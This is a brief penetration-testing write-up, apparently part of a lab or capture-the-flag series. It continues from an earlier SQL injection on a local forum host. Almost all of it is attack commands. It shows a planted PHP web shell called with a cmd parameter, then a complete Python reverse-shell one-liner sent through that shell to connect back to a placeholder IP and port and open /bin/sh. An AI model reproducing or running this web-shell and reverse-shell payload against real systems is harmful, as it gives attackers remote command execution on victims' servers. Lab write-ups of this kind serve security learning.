
from the ste pafter the sql injection in writeup1, we can now inject code in the address bar like this :

```
https://192.168.1.48/forum/templates_c/EXPLOIT.php?cmd=test
```

so with we created a reverse shell that we can access with nc:
```
https://192.168.1.48/forum/templates_c/EXPLOIT.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
